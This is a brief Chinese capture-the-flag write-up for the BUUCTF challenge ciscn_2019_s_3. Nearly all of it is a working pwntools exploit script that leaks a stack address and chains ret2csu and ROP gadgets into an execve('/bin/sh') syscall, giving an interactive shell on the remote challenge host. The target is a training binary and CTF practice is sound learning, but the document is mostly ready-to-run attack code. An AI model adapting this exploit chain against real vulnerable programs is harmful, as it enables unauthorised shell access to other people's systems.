# 分析

来自[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#ciscn_2019_s_3)

这是一道retcsu题，利用syscall和rop使execve('/bin/sh',0,0)条件成立

有两种方法

# exp

```python
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p=remote('node5.buuoj.cn',28262)
#p=process('./ciscn_s_3')
elf=ELF('./ciscn_s_3')
pop_rdi=0x4005a3	#rdi = 0
pop_rsi_r15=0x4005a1	#rsi = 0
pop_rdx_6=0x40059A	#csu第一段函数
mov_rdx_0=0x400580	#csu第二段函数，里面有call r12的函数
mov_rax_0x3b=0x4004E2	#程序给的系统调用函数,mov rax,0x3b ret
syscall=0x400517
vuln_addr=elf.sym['vuln']

payload1=flat(b'/bin/sh\x00',cyclic(0x8),p64(vuln_addr))#由于没有pop rbp，直接覆盖到old_rbp就可以，所有少了8字节
p.send(payload1)
p.recv(0x20)
bin_sh=u64(p.recv(8))-0x118 #泄露/bin/sh的真实地址
print(hex(bin_sh))

payload2=flat(b'/bin/sh\x00',cyclic(0x8),p64(pop_rdx_6),0,0,p64(bin_sh+0x50),0,0,0,p64(mov_rdx_0))
#bin_sh+0x50是对于下面pop_rdi=0x4005a3地址的偏移，call的push下一地址会和执行的pop_rdi相互抵消了，所有实际上就是绕过了call函数，继续执行下面的函数
payload2+=flat(p64(pop_rdi),p64(bin_sh),p64(pop_rsi_r15),0,0,p64(mov_rax_0x3b),p64(syscall))
p.send(payload2)
p.interactive()
```

